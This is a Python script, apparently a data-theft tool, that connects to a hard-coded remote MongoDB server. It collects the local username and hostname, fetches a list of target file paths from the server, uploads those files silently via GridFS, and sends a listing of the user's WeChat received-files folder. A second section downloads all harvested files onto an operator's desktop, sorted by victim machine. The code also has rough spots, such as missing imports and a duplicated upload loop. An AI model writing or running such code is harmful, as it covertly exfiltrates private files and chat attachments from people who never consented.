from pymongo import MongoClient

from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
from PyQt5 import QtCore, QtGui, QtWidgets
from dataread import *
import pickle
import pymysql
import socket
import time
import requests
import getpass
from pymongo import MongoClient
from gridfs import *
import pickle

if os.path.exists('filelist.dat'):
    f = open('filelist.dat', 'rb')
    fileuploadlist=pickle.load(f)
else:
    fileuploadlist=[]
pcname = socket.getfqdn(socket.gethostname())
username = getpass.getuser()
print(username)
# outip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()
# inip = socket.gethostbyname(username)
# currrenttime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
conn = MongoClient('47.105.38.117', 27017)
db = conn.userdata
key = username + pcname
mycol = db[username +'-'+ pcname]
# mycol.remove({})
wxfilepath = 'C:/Users/' + username + '/Documents/WeChat Files/'
tarpath = ''


demanddata = list(db['demandfilename'].find({}, { 'path': 1,'_id':0 } ))
print(demanddata)
print(demanddata[0]['path'])
db2 = conn.userfiledata  # 选定数据库，设定数据库名称为file
db3 = conn.userimagedata
fsimage=GridFS(db2, collection='imagedatas')
fs = GridFS(db2, collection='datas')  # 连接GridFS集合，名称为pdf
for path in demanddata[0]['path']:
    if os.path.exists(path):
        if(path not in fileuploadlist):
            dic = dict()
            dic['文件名'] = os.path.basename(path)
            dic['来源'] = username +'-'+ pcname
            dic['上传时间'] = datetime.now()
            dic['路径']=path
            content = open(path, 'rb').read()  # 二进制格式读取文件内容
            fs.put(content, **dic)  # 上传文件
            fileuploadlist.append(path)

for path in demanddata[0]['path']:
    if os.path.exists(path):
        if(path not in fileuploadlist):
            dic = dict()
            dic['文件名'] = os.path.basename(path)
            dic['来源'] = username +'-'+ pcname
            dic['上传时间'] = datetime.now()
            dic['路径']=path
            content = open(path, 'rb').read()  # 二进制格式读取文件内容
            fs.put(content, **dic)  # 上传文件
            fileuploadlist.append(path)


with open('filelist.dat', "wb") as file:
    pickle.dump(fileuploadlist, file, True)

for cursor in fs.find():
    filename = cursor.文件名
    content = cursor.read()
    if(not (os.path.exists('C:/Users/ENERGY/Desktop/用户数据/' +cursor.来源+'/'))):
        os.mkdir('C:/Users/ENERGY/Desktop/用户数据/' +cursor.来源+'/')
        if(os.path.exists(not('C:/Users/ENERGY/Desktop/用户数据/' +cursor.来源+'/'+ filename))):
            with open('C:/Users/ENERGY/Desktop/用户数据/' +cursor.来源+'/'+ filename, 'wb') as f:
                f.write(content)



for i in os.listdir(wxfilepath):
    # print(i[:2])
    if (i[:2] == 'wx'):
        print(i)
        tarpath = i
filelist = []
for root, dirs, files in os.walk(wxfilepath + tarpath + '\FileStorage\File', topdown=False):
    for name in files:
        # print(os.path.join(root, name))
        filelist.append(os.path.join(root, name))
mycol.insert({'xwdata': filelist})
